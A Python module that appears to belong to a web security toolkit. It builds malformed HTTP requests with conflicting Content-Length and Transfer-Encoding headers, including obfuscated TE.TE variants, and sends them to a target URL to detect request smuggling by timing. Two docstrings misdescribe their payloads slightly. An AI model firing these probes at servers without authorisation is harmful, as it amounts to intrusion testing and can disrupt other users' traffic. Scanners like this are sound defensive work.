#!/usr/bin/python3
"""
HTTP Request Smuggler — detect CL.TE and TE.CL desync vulnerabilities.

Uses raw sockets (stdlib only — no requests) to send malformed HTTP/1.1
requests and detect timing anomalies that indicate request smuggling.

Inspired by defparam/smuggler and anshumanpattnaik/http-request-smuggling.
Detection method: time-delay (a smuggled request hangs waiting for data).

Usage:
  ../.venv/bin/python3 modules/smuggler.py -u https://target.com
  ../.venv/bin/python3 modules/smuggler.py -u https://target.com -m GET
"""
import argparse
import socket
import ssl
import time
import urllib.parse

from core.colors import bold, underline, end, red, yellow, green, run, good, bad, info, tab

CRLF = "\r\n"
TIMEOUT_BASELINE = 5    # normal request timeout
TIMEOUT_SMUGGLE  = 12   # if response takes longer → potential HRS
DELAY_THRESHOLD  = 10   # seconds delay = likely smuggled


def _raw_send(host: str, port: int, use_ssl: bool,
              payload: str, timeout: float) -> tuple[float, str]:
    ctx = ssl.create_default_context() if use_ssl else None
    if ctx:
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        if use_ssl:
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.sendall(payload.encode())
        t0   = time.time()
        data = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk: break
                data += chunk
        except (socket.timeout, ConnectionResetError):
            pass
        elapsed = time.time() - t0
        return elapsed, data.decode(errors="replace")
    finally:
        try: sock.close()
        except Exception: pass


def _build_clte(host: str, path: str, method: str) -> str:
    """CL.TE: Content-Length says 6 bytes but Transfer-Encoding says chunked.
    The backend reads 6 bytes via CL; 'G' is left in the buffer for the next request."""
    body = "0\r\n\r\nG"
    return (
        f"{method} {path} HTTP/1.1{CRLF}"
        f"Host: {host}{CRLF}"
        f"Content-Type: application/x-www-form-urlencoded{CRLF}"
        f"Content-Length: {len(body)}{CRLF}"
        f"Transfer-Encoding: chunked{CRLF}"
        f"Connection: close{CRLF}"
        f"{CRLF}"
        f"{body}"
    )


def _build_tecl(host: str, path: str, method: str) -> str:
    """TE.CL: chunked body size = 0x7 but CL = 6.
    The frontend reads chunks; backend reads 6 bytes CL and 'SMUGGLED' leaks."""
    body = f"7{CRLF}SMUGGLE{CRLF}0{CRLF}{CRLF}"
    return (
        f"{method} {path} HTTP/1.1{CRLF}"
        f"Host: {host}{CRLF}"
        f"Content-Type: application/x-www-form-urlencoded{CRLF}"
        f"Content-Length: 6{CRLF}"
        f"Transfer-Encoding: chunked{CRLF}"
        f"Connection: close{CRLF}"
        f"{CRLF}"
        f"{body}"
    )


def _build_te_obfuscated(host: str, path: str, method: str, obfuscation: str) -> str:
    """TE.TE with obfuscated Transfer-Encoding header to confuse one hop."""
    body = f"7{CRLF}SMUGGLE{CRLF}0{CRLF}{CRLF}"
    return (
        f"{method} {path} HTTP/1.1{CRLF}"
        f"Host: {host}{CRLF}"
        f"Content-Type: application/x-www-form-urlencoded{CRLF}"
        f"Content-Length: 6{CRLF}"
        f"Transfer-Encoding: chunked{CRLF}"
        f"Transfer-Encoding: {obfuscation}{CRLF}"
        f"Connection: close{CRLF}"
        f"{CRLF}"
        f"{body}"
    )


PAYLOADS = [
    ("CL.TE",              _build_clte),
    ("TE.CL",              _build_tecl),
    ("TE.TE (xchunked)",   lambda h,p,m: _build_te_obfuscated(h,p,m,"xchunked")),
    ("TE.TE (chunked )",   lambda h,p,m: _build_te_obfuscated(h,p,m,"chunked ")),
    ("TE.TE (CHUNKED)",    lambda h,p,m: _build_te_obfuscated(h,p,m,"CHUNKED")),
    ("TE.TE (identity)",   lambda h,p,m: _build_te_obfuscated(h,p,m,"identity, chunked")),
]


def scan(url: str, method: str = "POST") -> list[dict]:
    parsed  = urllib.parse.urlparse(url)
    host    = parsed.hostname
    use_ssl = parsed.scheme == "https"
    port    = parsed.port or (443 if use_ssl else 80)
    path    = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query

    results = []
    print(f"{run} {bold}Smuggler{end} → {url}  [{method}]\n")
    print(f"  {'Type':<25} {'Time':>8}  Result")
    print(f"  {'─'*25} {'─'*8}  {'─'*20}")

    for label, builder in PAYLOADS:
        payload = builder(host, path, method)
        t_start = time.time()
        elapsed, response = _raw_send(host, port, use_ssl, payload, TIMEOUT_SMUGGLE)
        total   = time.time() - t_start

        # Detect: response took much longer than baseline → potential HRS
        # Also check for 5xx errors (some backends expose HRS via error)
        status  = ""
        parts   = response.split()
        if len(parts) > 1:
            status = parts[1]

        timed_out  = total >= DELAY_THRESHOLD
        server_err = status.startswith("5")
        potential  = timed_out or server_err

        sym  = f"{red}⚠ POTENTIAL{end}" if potential else f"{green}OK{end}"
        t_str = f"{total:.2f}s"
        print(f"  {label:<25} {t_str:>8}  {sym}  {status}")
        results.append({"type": label, "elapsed": round(total,2),
                        "status": status, "potential": potential})

    vulns = [r for r in results if r["potential"]]
    print()
    if vulns:
        print(f"{bad} {red}{bold}{len(vulns)} potential HRS issue(s) — confirm manually with Burp Turbo Intruder.{end}")
    else:
        print(f"{good} No obvious timing delays detected.")
    return results


def main():
    parser = argparse.ArgumentParser(description="HTTP Request Smuggling detection via time-delay (CL.TE, TE.CL, TE.TE)")
    parser.add_argument("-u", dest="url",    required=True, help="Target URL")
    parser.add_argument("-m", dest="method", default="POST", help="HTTP method (default: POST)")
    args = parser.parse_args()
    scan(args.url, args.method.upper())


if __name__ == "__main__":
    main()
